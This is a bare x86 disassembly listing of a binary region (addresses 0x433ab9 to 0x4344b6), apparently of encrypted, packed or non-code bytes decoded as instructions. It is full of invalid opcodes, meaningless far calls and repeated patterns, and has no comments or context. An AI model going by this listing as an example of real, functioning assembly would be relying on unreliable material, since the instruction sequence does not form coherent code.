  433ab9:	or     eax,0x75179275
  433abe:	dec    eax
  433abf:	or     eax,0xdb0d4875
  433ac4:	or     al,0x68
  433ac6:	popa   
  433ac7:	popa   
  433ac8:	fsubr  DWORD PTR [edx-0x2779189f]
  433ace:	jmp    0xead8:0x3be7619a
  433ad5:	xchg   BYTE PTR [ecx-0x4e],ah
  433ad8:	cmp    ch,BYTE PTR [edi+0x68f4f01c]
  433ade:	popa   
  433adf:	popa   
  433ae0:	or     eax,0xdb0d4875
  433ae5:	or     al,0x68
  433ae7:	popa   
  433ae8:	popa   
  433ae9:	or     eax,0x170d48cd
  433aee:	or     al,0x68
  433af0:	popa   
  433af1:	popa   
  433af2:	or     eax,0x56610d91
  433af7:	cdq    
  433af8:	xchg   esi,eax
  433af9:	pop    ss
  433afa:	jne    0x433b14
  433afc:	or     eax,0x14d88675
  433b01:	add    al,0x61
  433b03:	popa   
  433b04:	popa   
  433b05:	popa   
  433b06:	out    0x8b,eax
  433b08:	or     eax,0x14d88675
  433b0d:	adc    BYTE PTR [ecx+0x61],ah
  433b10:	popa   
  433b11:	xchg   edx,eax
  433b12:	out    0x97,eax
  433b14:	or     eax,0xa20d8675
  433b19:	sahf   
  433b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b1b:	jne    0x433ab7
  433b1d:	mov    dl,0x9a
  433b1f:	scas   eax,DWORD PTR es:[edi]
  433b20:	sbb    al,0xa2
  433b22:	lock (bad) [eax+0x61]
  433b26:	popa   
  433b27:	fcom   DWORD PTR [ebp-0x6a279e0d]
  433b2d:	dec    esp
  433b2e:	popa   
  433b2f:	fcom   DWORD PTR [ebp-0x6a279e9c]
  433b35:	push   eax
  433b36:	popa   
  433b37:	fcom   DWORD PTR [ebp-0x6a279ed8]
  433b3d:	pop    eax
  433b3e:	popa   
  433b3f:	fcom   DWORD PTR [ebp-0x6a279ec4]
  433b45:	pop    ebp
  433b46:	popa   
  433b47:	fcom   DWORD PTR [ebp+0x750d6131]
  433b4d:	dec    eax
  433b4e:	or     eax,0x616810db
  433b53:	popa   
  433b54:	or     eax,0x9a2d9acd
  433b59:	pop    ss
  433b5a:	int    0x55
  433b5c:	or     eax,0x4348675
  433b61:	popa   
  433b62:	popa   
  433b63:	popa   
  433b64:	pop    ss
  433b65:	jne    0x433b5a
  433b67:	or     eax,0xcd0df375
  433b6c:	call   0xd4c:0xcd179a56
  433b73:	jne    0x433bc1
  433b75:	pop    ss
  433b76:	jne    0x433bd5
  433b78:	or     eax,0x1cd85d75
  433b7d:	xchg   edx,eax
  433b7e:	pop    ss
  433b7f:	jne    0x433ba9
  433b81:	fcom   DWORD PTR [ebp-0x6d119ea0]
  433b87:	or     eax,0x17a26075
  433b8c:	jne    0x433bee
  433b8e:	or     eax,0x1cd82875
  433b93:	call   0x4c75:0xd287517
  433b9a:	xchg   ebx,eax
  433b9b:	repnz mov ds:0x4ccd0d8c,al
  433ba1:	xchg   ebx,eax
  433ba2:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433ba9:	pusha  
  433baa:	xchg   ebx,eax
  433bab:	fsub   DWORD PTR [esi+0x61]
  433bae:	popa   
  433baf:	popa   
  433bb0:	or     eax,0xa20d2875
  433bb5:	not    ebp
  433bb7:	bound  esp,QWORD PTR [edx+0x62]
  433bba:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433bc0:	jne    0x433bea
  433bc2:	or     eax,0x62d5f7a2
  433bc7:	bound  esp,QWORD PTR [edx-0x24]
  433bca:	push   esi
  433bcb:	jne    0x433c2a
  433bcd:	pop    ss
  433bce:	jne    0x433c34
  433bd0:	or     eax,0xa20d2875
  433bd5:	not    ebp
  433bd7:	bound  esp,QWORD PTR [edx+0x62]
  433bda:	fmul   QWORD PTR ds:0x2c135dcd
  433be0:	push   0x58751792
  433be5:	fcom   DWORD PTR [ebp-0x6d119e07]
  433beb:	or     eax,0x17a2f975
  433bf0:	jne    0x433beb
  433bf2:	or     eax,0x1cd85875
  433bf7:	call   0x6475:0xd587517
  433bfe:	xchg   ebx,eax
  433bff:	repnz mov ds:0x64cd0d8c,al
  433c05:	xchg   ebx,eax
  433c06:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c0d:	stc    
  433c0e:	xchg   ebx,eax
  433c0f:	fcom   DWORD PTR [edi]
  433c11:	popa   
  433c12:	popa   
  433c13:	popa   
  433c14:	or     eax,0xa20d5875
  433c19:	not    ebp
  433c1b:	bound  esp,QWORD PTR [edx+0x62]
  433c1e:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433c24:	jne    0x433c7e
  433c26:	or     eax,0x62d5f7a2
  433c2b:	bound  esp,QWORD PTR [edx-0x24]
  433c2e:	push   esi
  433c2f:	jne    0x433c8e
  433c31:	pop    ss
  433c32:	jne    0x433c84
  433c34:	or     eax,0xa20d5875
  433c39:	not    ebp
  433c3b:	bound  esp,QWORD PTR [edx+0x62]
  433c3e:	fmul   QWORD PTR ds:0x2c135dcd
  433c44:	push   0x3c751792
  433c49:	fcom   DWORD PTR [ebp-0x6d119ee4]
  433c4f:	or     eax,0x17a21c75
  433c54:	jne    0x433c72
  433c56:	or     eax,0x1cd83c75
  433c5b:	call   0x5075:0xd3c7517
  433c62:	xchg   ebx,eax
  433c63:	repnz mov ds:0x50cd0d8c,al
  433c69:	xchg   ebx,eax
  433c6a:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c71:	sbb    al,0x73
  433c73:	mov    cs,WORD PTR ds:0xe3d83c75
  433c79:	mul    DWORD PTR [ecx-0x19]
  433c7c:	or     DWORD PTR ds:0xcd0d3c75,0xf7da565d
  433c86:	pop    ss
  433c87:	int    0x69
  433c89:	or     eax,0x610d6975
  433c8e:	push   esi
  433c8f:	jne    0x433ce6
  433c91:	or     eax,0x681769cd
  433c96:	out    dx,al
  433c97:	repnz lock int3 
  433c9a:	bound  esp,QWORD PTR [edx+0x62]
  433c9d:	lock sbb esp,DWORD PTR [ebx+0x62]
  433ca1:	bound  ebp,QWORD PTR [edi+0x2257a21c]
  433ca7:	xchg   BYTE PTR [ecx-0x5b],ah
  433caa:	or     eax,0x2c64d864
  433caf:	or     eax,0x75179275
  433cb4:	cmp    al,0xd
  433cb6:	jne    0x433cf4
  433cb8:	or     eax,0x61680cdb
  433cbd:	popa   
  433cbe:	fsubr  DWORD PTR [edx-0x27c4189f]
  433cc4:	jmp    0x1caf:0x3ab26186
  433ccb:	lock leave 
  433ccd:	push   0x750d6161
  433cd2:	cmp    al,0xd
  433cd4:	fisttp DWORD PTR [eax+ebp*2]
  433cd7:	popa   
  433cd8:	popa   
  433cd9:	or     eax,0x170d3ccd
  433cde:	or     al,0x68
  433ce0:	popa   
  433ce1:	popa   
  433ce2:	or     eax,0x56610d91
  433ce7:	cdq    
  433ce8:	xchg   esi,eax
  433ce9:	pop    ss
  433cea:	jne    0x433d34
  433cec:	or     eax,0xe3d88675
  433cf1:	jecxz  0x433d54
  433cf3:	mov    dl,0x9a
  433cf5:	scas   eax,DWORD PTR es:[edi]
  433cf6:	sbb    al,0xa2
  433cf8:	lock mov gs,WORD PTR [eax+0x61]
  433cfc:	popa   
  433cfd:	or     eax,0x1cd88675
  433d02:	jecxz  0x433d1b
  433d04:	jne    0x433d37
  433d06:	or     eax,0xcd0d3175
  433d0b:	call   0xdf9:0xcd179a56
  433d12:	jne    0x433d0d
  433d14:	or     eax,0x751792a2
  433d19:	sbb    BYTE PTR ds:0xcd0df975,cl
  433d1f:	call   0x5dcd:0x1776da56
  433d26:	or     eax,0xcd0df975
  433d2b:	call   0x60cd:0x17fbda56
  433d32:	or     eax,0xcd0df975
  433d37:	call   0xf3cd:0x178eda56
  433d3e:	fcom   DWORD PTR [ebp-0x6a279eb0]
  433d44:	dec    esp
  433d45:	popa   
  433d46:	or     eax,0xcd0df975
  433d4b:	stc    
  433d4c:	or     eax,0x99a77ea2
  433d51:	mov    al,ch
  433d53:	xchg   edi,eax
  433d54:	or     eax,0xa20df975
  433d59:	jle    0x433d72
  433d5b:	jne    0x433d7d
  433d5d:	out    dx,al
  433d5e:	xchg   ecx,eax
  433d5f:	or     eax,0xa20df975
  433d64:	mov    dl,BYTE PTR [edi]
  433d66:	jne    0x433d88
  433d68:	or     eax,0x75172075
  433d6d:	pop    eax
  433d6e:	fcom   DWORD PTR [ebp+0x3aee611c]
  433d74:	or     eax,0x17a21c75
  433d79:	jne    0x433d97
  433d7b:	or     eax,0x75a71c75
  433d80:	pop    eax
  433d81:	xchg   ebx,eax
  433d82:	fcom   DWORD PTR [ecx]
  433d84:	popa   
  433d85:	popa   
  433d86:	popa   
  433d87:	or     eax,0xcd0df975
  433d8c:	sbb    al,0xa7
  433d8e:	fidivr DWORD PTR [esi+0x73]
  433d91:	jl     0x433da0
  433d93:	jne    0x433db1
  433d95:	or     eax,0xa50d60cd
  433d9a:	call   0x64a5:0x17d67e56
  433da1:	or     eax,0xcd0d1c75
  433da6:	repz xchg ebx,eax
  433da8:	repnz neg DWORD PTR [ecx-0x11d78ae9]
  433daf:	cmp    ecx,DWORD PTR ds:0x75171c75
  433db5:	sub    BYTE PTR ds:0xcd0d2875,cl
  433dbb:	pop    ebp
  433dbc:	fcom   DWORD PTR [esi+0x5fb261d6]
  433dc2:	out    dx,al
  433dc3:	lods   eax,DWORD PTR ds:[esi]
  433dc4:	or     eax,0xcd0d2875
  433dc9:	pop    ebp
  433dca:	or     eax,0x7e569aa5
  433dcf:	(bad)  
  433dd0:	pop    ss
  433dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433dd2:	imul   ecx,DWORD PTR ds:0x75562875,0x55751718
  433ddc:	or     eax,0x75a76975
  433de1:	stc    
  433de2:	lds    esi,FWORD PTR [esi+0xd]
  433de5:	jne    0x433e18
  433de7:	or     eax,0xda56f9cd
  433dec:	mul    DWORD PTR [ecx-0x738c9633]
  433df2:	or     eax,0xcd0d2875
  433df7:	pop    ebp
  433df8:	or     eax,0x7517d6f7
  433dfd:	imul   ebp,esi,0x69750d93
  433e03:	sub    eax,0xcd0d9a75
  433e08:	sub    BYTE PTR ds:0xf7175da5,cl
  433e0e:	sbb    bl,al
  433e10:	jmp    0x1caf:0xf7b26169
  433e17:	out    dx,al
  433e18:	call   0xaf62:0x6262a4f0
  433e1f:	sbb    al,0xa2
  433e21:	push   edi
  433e22:	and    al,BYTE PTR [esi+0x640da561]
  433e28:	fsub   DWORD PTR [esi+esi*4+0x21]
  433e2c:	jne    0x433e6a
  433e2e:	lods   eax,DWORD PTR ds:[esi]
  433e2f:	loop   0x433e32
  433e31:	imul   esp,DWORD PTR [ecx],0xe2252875
  433e37:	add    DWORD PTR [ecx+0xd],ebp
  433e3a:	jne    0x433dce
  433e3c:	pop    ss
  433e3d:	jne    0x433e57
  433e3f:	or     eax,0xb853c75
  433e44:	call   0xa8e8:0x5e343ac9
  433e4b:	popa   
  433e4c:	pop    ss
  433e4d:	jne    0x433eb3
  433e4f:	and    DWORD PTR [ebp+0x5d],esi
  433e52:	push   edx
  433e53:	out    dx,al
  433e54:	enter  0xd56,0x75
  433e58:	cmp    al,0x85
  433e5a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433e60:	call   0x755aa00d
  433e65:	repz or eax,0xb853c75
  433e6b:	call   0xa8e8:0x5e343ac9
  433e72:	popa   
  433e73:	pop    ss
  433e74:	jne    0x433ea7
  433e76:	or     eax,0xb853c75
  433e7b:	call   0xa8e8:0x5e343ac9
  433e82:	popa   
  433e83:	pop    ss
  433e84:	jne    0x433ed6
  433e86:	or     eax,0xb853c75
  433e8b:	call   0xa8e8:0x5e343ac9
  433e92:	popa   
  433e93:	pop    ss
  433e94:	jne    0x433eff
  433e96:	or     eax,0xb853c75
  433e9b:	call   0xa8e8:0x5e343ac9
  433ea2:	popa   
  433ea3:	pop    ss
  433ea4:	jne    0x433efb
  433ea6:	and    DWORD PTR [ebp+0x48],esi
  433ea9:	push   edx
  433eaa:	out    dx,al
  433eab:	enter  0xd56,0x75
  433eaf:	cmp    al,0x85
  433eb1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433eb7:	call   0xcd50a064
  433ebc:	sbb    BYTE PTR ds:0x61680c17,cl
  433ec2:	popa   
  433ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ec4:	push   0x750d7be7
  433ec9:	cmp    al,0x85
  433ecb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433ed1:	call   0x75eaa07e
  433ed6:	xchg   bh,ah
  433ed8:	ror    DWORD PTR ds:0xdb0d1875,0xc
  433edf:	push   0xcd0d6161
  433ee4:	sbb    BYTE PTR ds:0x61680c17,cl
  433eea:	popa   
  433eeb:	or     eax,0x56610d91
  433ef0:	cdq    
  433ef1:	xchg   esi,eax
  433ef2:	pop    ss
  433ef3:	jne    0x433f4d
  433ef5:	or     eax,0xb853c75
  433efa:	call   0xa8e8:0x5e343ac9
  433f01:	popa   
  433f02:	or     eax,0xd6a186cd
  433f07:	(bad)  [ecx+0x61]
  433f0a:	popa   
  433f0b:	out    0x89,eax
  433f0d:	or     eax,0xcd0d8675
  433f12:	call   0x6161:0x61db0456
  433f19:	pop    ss
  433f1a:	int    0x5d
  433f1c:	out    dx,al
  433f1d:	mov    BYTE PTR ds:0xb852875,cl
  433f23:	call   0xa8e8:0x5e343ac9
  433f2a:	popa   
  433f2b:	lock adc edx,DWORD PTR [esi+0x61]
  433f2f:	popa   
  433f30:	out    dx,al
  433f31:	mov    BYTE PTR ds:0xb853c75,cl
  433f37:	call   0xa8e8:0x5e343ac9
  433f3e:	popa   
  433f3f:	lock ficom WORD PTR [esi+0x61]
  433f43:	popa   
  433f44:	and    DWORD PTR [ebp+0x4c],esi
  433f47:	lods   eax,DWORD PTR ds:[esi]
  433f48:	loop   0x433f4b
  433f4a:	imul   ebp,esi,0x48750d92
  433f50:	xor    esp,DWORD PTR [edi-0x18]
  433f53:	test   al,0x61
  433f55:	test   DWORD PTR [ebx],ecx
  433f57:	call   0xd4c:0x75173ac9
  433f5e:	jne    0x433fac
  433f60:	test   DWORD PTR [ebx],ecx
  433f62:	call   0xa8e8:0x5e343ac9
  433f69:	popa   
  433f6a:	pop    ss
  433f6b:	jne    0x433fb5
  433f6d:	or     eax,0x75a74875
  433f72:	dec    esp
  433f73:	out    0x7d,eax
  433f75:	or     eax,0x1c7b4875
  433f7a:	jle    0x433f89
  433f7c:	int    0x3c
  433f7e:	(bad)  
  433f7f:	outs   dx,DWORD PTR ds:[esi]
  433f80:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433f86:	pop    esi
  433f87:	call   0xa550a134
  433f8c:	pop    ebp
  433f8d:	mov    eax,ds:0x78b25f86
  433f92:	or     eax,0x1c7b4875
  433f97:	jle    0x433fa6
  433f99:	int    0x3c
  433f9b:	(bad)  
  433f9c:	outs   dx,DWORD PTR ds:[esi]
  433f9d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433fa3:	pop    esi
  433fa4:	call   0xa550a151
  433fa9:	pop    ebp
  433faa:	mov    eax,ds:0x93925fc6
  433faf:	outs   dx,BYTE PTR ds:[esi]
  433fb0:	inc    esi
  433fb1:	pop    edi
  433fb2:	popa   
  433fb3:	popa   
  433fb4:	or     eax,0xb853c75
  433fb9:	call   0xa8e8:0x5e343ac9
  433fc0:	popa   
  433fc1:	pop    ss
  433fc2:	jne    0x43402d
  433fc4:	or     eax,0xb853c75
  433fc9:	call   0xa8e8:0x5e343ac9
  433fd0:	popa   
  433fd1:	pop    ss
  433fd2:	jne    0x434029
  433fd4:	or     eax,0x1c7b4875
  433fd9:	jle    0x434031
  433fdb:	jne    0x43403a
  433fdd:	pop    ss
  433fde:	jne    0x433fd9
  433fe0:	or     eax,0xcd0df975
  433fe5:	call   0x31cd:0x1792da56
  433fec:	or     eax,0xb853c75
  433ff1:	call   0xa8e8:0x5e343ac9
  433ff8:	popa   
  433ff9:	pop    ss
  433ffa:	jne    0x433fef
  433ffc:	or     eax,0xb853c75
  434001:	call   0xa8e8:0x5e343ac9
  434008:	popa   
  434009:	or     eax,0x68a1f9cd
  43400e:	out    0x97,eax
  434010:	or     eax,0xcd0df975
  434015:	call   0xdf3:0xcd179a56
  43401c:	jne    0x43405a
  43401e:	test   DWORD PTR [ebx],ecx
  434020:	call   0xdf9:0xcd0d3ac9
  434027:	rol    DWORD PTR [esi+0x5e9a6e13],1
  43402d:	call   0x7599a1da
  434032:	call   0x1c75:0x13507517
  434039:	pop    ss
  43403a:	jne    0x43409c
  43403c:	or     eax,0x61216075
  434041:	sub    edx,esp
  434043:	add    DWORD PTR [ecx+0x62],ebp
  434046:	mov    dl,0x50
  434048:	or     eax,0xdb0d1875
  43404d:	dec    eax
  43404e:	push   0x92626161
  434053:	pop    ss
  434054:	jne    0x4340bf
  434056:	or     eax,0xb853c75
  43405b:	call   0xa8e8:0x5e343ac9
  434062:	popa   
  434063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434064:	jne    0x4340cf
  434066:	mov    dl,0x88
  434068:	bound  esi,QWORD PTR [edx+0x18750d50]
  43406e:	or     eax,0x616848db
  434073:	popa   
  434074:	(bad)
  434079:	imul   esp,DWORD PTR [ecx],0x874d1475
  43407f:	xchg   esp,eax
  434080:	fcom   QWORD PTR [ebx]
  434082:	jne    0x434098
  434084:	pop    ss
  434085:	jne    0x4340a7
  434087:	or     eax,0x61212075
  43408c:	(bad)  
  43408d:	cmc    
  43408e:	add    DWORD PTR [ecx+0xd],ebp
  434091:	jne    0x4340cf
  434093:	test   DWORD PTR [ebx],ecx
  434095:	call   0xa8e8:0x5e343ac9
  43409c:	popa   
  43409d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43409e:	jne    0x434109
  4340a0:	mov    dl,0xaf
  4340a2:	or     eax,0xb852875
  4340a7:	call   0x1355:0xcd0d3ac9
  4340ae:	outs   dx,BYTE PTR ds:[esi]
  4340af:	push   0x61a8e85e
  4340b4:	pop    ss
  4340b5:	jne    0x43410c
  4340b7:	or     eax,0xb851475
  4340bc:	call   0xa8e8:0x5e343ac9
  4340c3:	popa   
  4340c4:	xchg   ebx,eax
  4340c5:	mov    edx,0xdd25575
  4340ca:	jne    0x4340e4
  4340cc:	or     eax,0x616848db
  4340d1:	popa   
  4340d2:	(bad)
  4340d7:	cmp    al,0x85
  4340d9:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4340df:	call   0x75eaa28c
  4340e4:	imul   esi,DWORD PTR [edx+0x1c750d6a],0xc99a0b85
  4340ee:	cmp    dh,BYTE PTR [esi+ebx*2]
  4340f1:	call   0x75e4a29e
  4340f6:	push   ebp
  4340f7:	xchg   ebx,eax
  4340f8:	mov    ch,0xda
  4340fa:	bound  esp,QWORD PTR [edx+0x62]
  4340fd:	or     eax,0xb853c75
  434102:	call   0xa8e8:0x5e343ac9
  434109:	popa   
  43410a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43410b:	jne    0x434176
  43410d:	mov    dl,0x80
  43410f:	or     eax,0xb852875
  434114:	call   0x1364:0xcd0d3ac9
  43411b:	outs   dx,BYTE PTR ds:[esi]
  43411c:	push   0x61a8e85e
  434121:	pop    ss
  434122:	jne    0x434188
  434124:	lock retf 0x6168
  434128:	popa   
  434129:	and    DWORD PTR [ebp+0x8],esi
  43412c:	pusha  
  43412d:	xchg   DWORD PTR [eax-0x528ade98],ecx
  434133:	push   edx
  434134:	xor    esi,edi
  434136:	mov    WORD PTR ds:0xb853c75,cs
  43413c:	call   0xa8e8:0x5e343ac9
  434143:	popa   
  434144:	pop    ss
  434145:	jne    0x4340f8
  434147:	out    dx,al
  434148:	imul   ecx,DWORD PTR ds:0xb852875,0xffffff9a
  43414f:	leave  
  434150:	cmp    cl,BYTE PTR ds:0x6e13b1cd
  434156:	push   0x61a8e85e
  43415b:	pop    ss
  43415c:	jne    0x43410f
  43415e:	or     eax,0xb853c75
  434163:	call   0xa8e8:0x5e343ac9
  43416a:	popa   
  43416b:	or     eax,0xa50db1cd
  434170:	xor    DWORD PTR [ecx+0x6e931af7],esp
  434176:	cmp    ch,BYTE PTR [eax+0x61]
  434179:	popa   
  43417a:	or     eax,0xb853c75
  43417f:	call   0xa8e8:0x5e343ac9
  434186:	popa   
  434187:	pop    ss
  434188:	jne    0x434192
  43418a:	or     eax,0xb853c75
  43418f:	call   0xa8e8:0x5e343ac9
  434196:	popa   
  434197:	pop    ss
  434198:	jne    0x434147
  43419a:	or     eax,0xb853c75
  43419f:	call   0xa8e8:0x5e343ac9
  4341a6:	popa   
  4341a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341a8:	jne    0x43419d
  4341aa:	out    0x86,eax
  4341ac:	or     eax,0xcd0db175
  4341b1:	repz or eax,0x7517d6f7
  4341b7:	or     BYTE PTR ds:0xcd0db175,cl
  4341bd:	xor    DWORD PTR ds:0x7517d6f7,ecx
  4341c3:	lods   eax,DWORD PTR ds:[esi]
  4341c4:	or     eax,0xb853c75
  4341c9:	call   0xa8e8:0x5e343ac9
  4341d0:	popa   
  4341d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341d2:	jne    0x4341dc
  4341d4:	out    0xa2,eax
  4341d6:	or     eax,0xb853c75
  4341db:	call   0xa8e8:0x5e343ac9
  4341e2:	popa   
  4341e3:	or     eax,0x3fd608cd
  4341e8:	popa   
  4341e9:	popa   
  4341ea:	popa   
  4341eb:	fisttp DWORD PTR [edx+0x47]
  4341ee:	xchg   DWORD PTR [edi+0x4a],edx
  4341f1:	inc    edi
  4341f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341f3:	pop    ds
  4341f4:	out    0xfb,eax
  4341f6:	or     eax,0x62d50875
  4341fb:	bound  esp,QWORD PTR [ecx+0x61]
  4341fe:	xchg   ebx,eax
  4341ff:	repnz sbb al,0xd2
  434202:	bound  esi,QWORD PTR [edx+0x18750d69]
  434208:	or     eax,0x616848db
  43420d:	popa   
  43420e:	(bad)  
  434210:	call   0xd79:0xeead7517
  434217:	jne    0x4341b3
  434219:	push   esi
  43421a:	jne    0x4341c9
  43421c:	pop    ss
  43421d:	jne    0x434243
  43421f:	or     eax,0xa2a22475
  434224:	shl    BYTE PTR [edx-0x4e],cl
  434227:	imul   ecx,DWORD PTR ds:0xdb0d1875,0x61616848
  434231:	(bad)  
  434233:	call   0x3c75:0xdad7517
  43423a:	test   DWORD PTR [ebx],ecx
  43423c:	call   0xa8e8:0x5e343ac9
  434243:	popa   
  434244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434245:	jne    0x4341f4
  434247:	mov    dl,0x8b
  434249:	or     eax,0xb852875
  43424e:	call   0x1364:0xcd0d3ac9
  434255:	outs   dx,BYTE PTR ds:[esi]
  434256:	push   0x61a8e85e
  43425b:	pop    ss
  43425c:	jne    0x4342c2
  43425e:	out    dx,al
  43425f:	jbe    0x43426e
  434261:	jne    0x43428b
  434263:	test   DWORD PTR [ebx],ecx
  434265:	call   0xa8e8:0x5e343ac9
  43426c:	popa   
  43426d:	or     eax,0xba93adcd
  434272:	pop    ds
  434273:	or     eax,0xa50db1cd
  434278:	xor    DWORD PTR [edi],edx
  43427a:	neg    DWORD PTR [edx]
  43427c:	lock pusha 
  43427e:	arpl   WORD PTR [edx+0x62],sp
  434281:	lock and DWORD PTR [ebp+0x62],edx
  434285:	bound  ecx,QWORD PTR ds:0xb853c75
  43428b:	call   0xa8e8:0x5e343ac9
  434292:	popa   
  434293:	mov    eax,ds:0x88e76475
  434298:	or     eax,0xb853c75
  43429d:	call   0xa8e8:0x5e343ac9
  4342a4:	popa   
  4342a5:	pop    ss
  4342a6:	jne    0x4342fc
  4342a8:	out    dx,al
  4342a9:	xchg   edx,eax
  4342aa:	or     eax,0xb852875
  4342af:	call   0xa8e8:0x5e343ac9
  4342b6:	popa   
  4342b7:	pop    ss
  4342b8:	jne    0x43430e
  4342ba:	or     eax,0x22575475
  4342bf:	xchg   BYTE PTR [ecx-0x5b],ah
  4342c2:	or     eax,0xa264d864
  4342c7:	and    DWORD PTR [ebp+0x69],esi
  4342ca:	lods   eax,DWORD PTR ds:[esi]
  4342cb:	loop   0x4342ce
  4342cd:	imul   esp,DWORD PTR [ecx],0xe2255d75
  4342d3:	add    DWORD PTR [ecx+0xd],ebp
  4342d6:	jne    0x43425e
  4342d8:	pop    ss
  4342d9:	jne    0x434330
  4342db:	or     eax,0x69750d1c
  4342e0:	test   DWORD PTR [ebx],ecx
  4342e2:	call   0xa8e8:0x5e343ac9
  4342e9:	popa   
  4342ea:	mov    eax,ds:0x6e939a75
  4342ef:	mov    bh,0x68
  4342f1:	popa   
  4342f2:	popa   
  4342f3:	or     eax,0xcd0d9a75
  4342f8:	call   0x31cd:0x1796da56
  4342ff:	and    DWORD PTR [ebp+0x64],esi
  434302:	sub    edx,esp
  434304:	add    DWORD PTR [ecx+0xd],ebp
  434307:	jne    0x43436d
  434309:	test   DWORD PTR [ebx],ecx
  43430b:	call   0xd669:0xcd0d3ac9
  434312:	outs   dx,DWORD PTR ds:[esi]
  434313:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434319:	pop    esi
  43431a:	call   0xa550a4c7
  43431f:	xor    DWORD PTR [ecx-0xa2dddf0],esp
  434325:	add    eax,0x956e9368
  43432a:	push   0x750d6161
  43432f:	xor    DWORD PTR ds:0x4569acd,ecx
  434335:	std    
  434336:	popa   
  434337:	popa   
  434338:	popa   
  434339:	pop    ss
  43433a:	int    0x18
  43433c:	or     eax,0xcd0d9a75
  434341:	xor    DWORD PTR ds:0x75179e99,ebp
  434347:	repz or eax,0xb856975
  43434d:	call   0xa8e8:0x5e343ac9
  434354:	popa   
  434355:	mov    eax,ds:0x6e93f375
  43435a:	sahf   
  43435b:	push   0x750d6161
  434360:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0xa8e85e34
  43436a:	popa   
  43436b:	pop    ss
  43436c:	jne    0x4343b6
  43436e:	and    DWORD PTR [ebp+0x3c],esi
  434371:	and    esp,edx
  434373:	add    DWORD PTR [ecx+0xd],ebp
  434376:	jne    0x434390
  434378:	or     eax,0x7517f7a2
  43437d:	push   eax
  43437e:	out    dx,al
  43437f:	xchg   ecx,eax
  434380:	or     eax,0xa20d1875
  434385:	not    DWORD PTR [edi]
  434387:	jne    0x4343d9
  434389:	or     eax,0xb856975
  43438e:	call   0xa8e8:0x5e343ac9
  434395:	popa   
  434396:	mov    eax,ds:0x6e935075
  43439b:	gs popa 
  43439d:	popa   
  43439e:	popa   
  43439f:	or     eax,0xb856975
  4343a4:	call   0xa8e8:0x5e343ac9
  4343ab:	popa   
  4343ac:	pop    ss
  4343ad:	jne    0x4343d7
  4343af:	out    dx,al
  4343b0:	cmp    cl,BYTE PTR ds:0x17a22875
  4343b6:	jne    0x4343e0
  4343b8:	or     eax,0xf3d85075
  4343bd:	call   0x9328:0x75a1f34f
  4343c4:	fdiv   st,st(5)
  4343c6:	popa   
  4343c7:	popa   
  4343c8:	popa   
  4343c9:	or     eax,0xcd0d2875
  4343ce:	sbb    BYTE PTR [ebx-0x6566d30e],dl
  4343d4:	aad    0x62
  4343d6:	xchg   ebx,eax
  4343d7:	popa   
  4343d8:	popa   
  4343d9:	pop    ss
  4343da:	jne    0x4343d5
  4343dc:	or     eax,0x610d1875
  4343e1:	or     eax,0x6e13f9cd
  4343e6:	call   0xb85:0x62531334
  4343ed:	call   0xd58:0x75173ac9
  4343f4:	jne    0x43441e
  4343f6:	or     eax,0xf29318cd
  4343fb:	sub    al,0x99
  4343fd:	call   0x4c75:0x1786691f
  434404:	or     eax,0xb855875
  434409:	call   0x139a:0xcd0d3ac9
  434410:	outs   dx,BYTE PTR ds:[esi]
  434411:	push   0x61a8e85e
  434416:	pop    ss
  434417:	jne    0x434479
  434419:	or     eax,0xcd0d4c75
  43441e:	cmp    al,0xd6
  434420:	outs   dx,DWORD PTR ds:[esi]
  434421:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434427:	pop    esi
  434428:	call   0x1feaa5d5
  43442d:	out    0xf7,eax
  43442f:	out    dx,al
  434430:	fucomi st,st(6)
  434432:	aaa    
  434433:	or     eax,0xcd0d4c75
  434438:	cmp    al,0xd6
  43443a:	outs   dx,DWORD PTR ds:[esi]
  43443b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434441:	pop    esi
  434442:	call   0x1feaa5ef
  434447:	mov    dl,0x8f
  434449:	or     eax,0x75176075
  43444e:	sbb    al,0xd
  434450:	jne    0x43446e
  434452:	or     eax,0xf3755661
  434457:	or     eax,0x68171ccd
  43445c:	lock shl BYTE PTR [edx+0x62],cl
  434460:	bound  ecx,QWORD PTR ds:0x75564875
  434466:	push   eax
  434467:	pop    ss
  434468:	jne    0x4344b2
  43446a:	or     eax,0xcd0d4875
  43446f:	fs (bad) 
  434471:	outs   dx,DWORD PTR ds:[esi]
  434472:	or     ebx,DWORD PTR [edx-0x5af2c537]
  434478:	xor    DWORD PTR [edi-0xa41b192],esp
  43447e:	add    eax,0xee5fe868
  434483:	mov    WORD PTR ds:0x75561875,cs
  434489:	push   eax
  43448a:	pop    ss
  43448b:	jne    0x4344a5
  43448d:	lock in eax,dx
  43448f:	arpl   WORD PTR [edx+0x62],sp
  434492:	or     eax,0xb855d75
  434497:	call   0xa8e8:0x5e343ac9
  43449e:	popa   
  43449f:	out    dx,al
  4344a0:	lea    ecx,ds:0xb856975
  4344a6:	call   0xa8e8:0x5e343ac9
  4344ad:	popa   
  4344ae:	push   edi
  4344af:	and    bl,BYTE PTR [edx+0x640da561]
  4344b5:	(bad)  
  4344b6:	fs pop ebp
